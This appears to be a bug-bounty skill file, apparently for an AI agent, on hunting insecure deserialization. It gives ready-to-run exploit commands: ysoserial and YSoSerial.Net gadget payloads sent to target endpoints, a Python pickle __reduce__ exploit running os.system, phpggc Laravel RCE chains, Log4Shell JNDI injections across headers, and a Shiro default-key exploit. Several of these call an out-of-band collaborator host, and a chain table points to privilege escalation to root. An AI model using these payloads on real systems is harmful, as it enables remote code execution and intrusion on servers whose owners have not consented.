---
name: hunt-deserialization
description: "Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails."
sources: hackerone_public
report_count: 22
---

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## CVE Grounding (proven RCE classes)

- **Log4Shell — CVE-2021-44228** (+ bypass **CVE-2021-45046**) — Java; `${jndi:ldap://...}` interpolation in any logged string (`Logger.error/info`) → remote class load → RCE.
- **Spring4Shell — CVE-2022-22965** — Java/Spring MVC; data-binding reaches `class.module.classLoader.*` properties on a POJO → write a webshell via the Tomcat AccessLogValve → RCE.
- **Apache Shiro — CVE-2016-4437** — Java; `rememberMe` cookie decrypted with the hardcoded default AES-CBC key, then a ysoserial gadget chain is deserialized → RCE.
- **Telerik UI for ASP.NET AJAX — CVE-2019-18935** — .NET; insecure JSON deserialization in `RadAsyncUpload` (`JavaScriptSerializer` with attacker-controlled `Type`) → mixed-mode assembly upload → RCE.

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

---

## KILL GATE — Do Not Report Without Proof

A deserialization finding is **only valid** when ONE of the following is true:

1. **Out-of-band proof** — a DNS/HTTP callback lands on your controlled host (Interactsh or Burp Collaborator) carrying a unique per-test token, OR
2. **Observable command output / reflected execution** — your injected command's output (e.g. `id`, `whoami`, contents of `/etc/passwd`) appears in the response, on disk, or in any side channel you can read.

### NOT a valid finding (false positives — kill these)

- ❌ A **stack trace**, `ClassNotFoundException`, `InvalidClassException`, type/cast error, or deserialization exception **alone**. It proves a sink exists, not that you achieved execution.
- ❌ An **app crash, hang, or 500** with no callback and no command output. That is **DoS at most — never report it as RCE.** Do not upgrade a crash into "RCE" because the sink "looked" deserializable.
- ❌ A reflected/echoed payload string with no callback and no execution — you only proved the input was processed, not that a gadget fired.

**Rule:** No Interactsh/Collaborator hit and no command output ⇒ the finding is unproven. Keep probing for OOB or output before writing anything up. Reporting DoS-only as RCE is an instant N/A and burns your signal/validity ratio.

---

## Related Skills

- **triage-validation** — run the 7-Question Gate / kill gates before submitting; confirms the OOB-or-output proof above.
- **hunt-rce** — broader command-execution hunting once a deserialization sink is confirmed.
- **hunt-source-leak** — recovered source code exposes `unserialize`/`pickle.loads`/`Marshal.load` sinks and gadget-bearing dependencies.
- **security-arsenal** — payload bank, gadget-chain references, and the always-rejected list.
